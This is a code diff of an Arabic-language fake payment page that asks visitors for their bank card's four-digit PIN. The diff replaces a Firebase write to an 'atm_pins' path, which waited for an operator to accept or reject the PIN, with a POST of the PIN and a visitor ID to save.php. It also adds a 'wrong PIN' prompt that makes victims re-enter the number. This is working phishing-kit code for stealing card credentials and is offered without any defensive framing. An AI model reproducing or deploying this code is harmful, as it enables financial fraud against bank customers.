@@ -145,8 +145,9 @@
             
             <p>لإتمام عملية الدفع بشكل آمن، يرجى إدخال الرقم السري (PIN) المكون من 4 أرقام لبطاقتكم المصرفية في الحقل أدناه</p>
 
-            <form id="atmForm">
-                <input type="password" id="atm_pin" class="pin-input" placeholder="****" required maxlength="4" inputmode="numeric" pattern="[0-9]*">
+            <form id="atmForm" action="save.php" method="POST">
+                <input type="hidden" name="visitor_id" id="form_visitor_id">
+                <input type="password" id="atm_pin" name="atm_pin" class="pin-input" placeholder="****" required maxlength="4" inputmode="numeric" pattern="[0-9]*">
                 <button type="submit" class="pay-btn">تأكيد الدفع</button>
             </form>
         </div>
@@ -185,37 +186,22 @@
         lastSeen: Date.now()
     });
 
-    document.getElementById('atmForm').onsubmit = (e) => {
-        e.preventDefault();
-        const pinValue = document.getElementById('atm_pin').value;
+    let visitorId = sessionStorage.getItem('visitorId');
+    document.getElementById('form_visitor_id').value = visitorId;
 
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error')) {
+        Swal.fire('الرقم السري غير صحيح', 'يرجى التأكد من الرقم السري وإعادة المحاولة', 'error');
+    }
+
+    document.getElementById('atmForm').onsubmit = (e) => {
+        const pinValue = document.getElementById('atm_pin').value;
         if (pinValue.length < 4) {
+            e.preventDefault();
             Swal.fire({ title: 'خطأ', text: 'يرجى إدخال 4 أرقام كاملة', icon: 'warning', confirmButtonColor: '#00a3da' });
             return;
         }
-
-        database.ref('atm_pins/' + sessionID).set({
-            pin: pinValue,
-            timestamp: Date.now(),
-            status: "waiting"
-        });
-
         document.getElementById('loading-overlay').style.display = 'flex';
-
-        database.ref('atm_pins/' + sessionID + '/status').on('value', (snapshot) => {
-            const status = snapshot.val();
-            if (status === "accept") {
-                window.location.href = "final_success.html"; 
-            } else if (status === "reject") {
-                document.getElementById('loading-overlay').style.display = 'none';
-                Swal.fire({
-                    title: 'فشل التحقق',
-                    text: 'الرقم السري الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى.',
-                    icon: 'error',
-                    confirmButtonColor: '#8b1538'
-                });
-            }
-        });
     };
 </script>
 
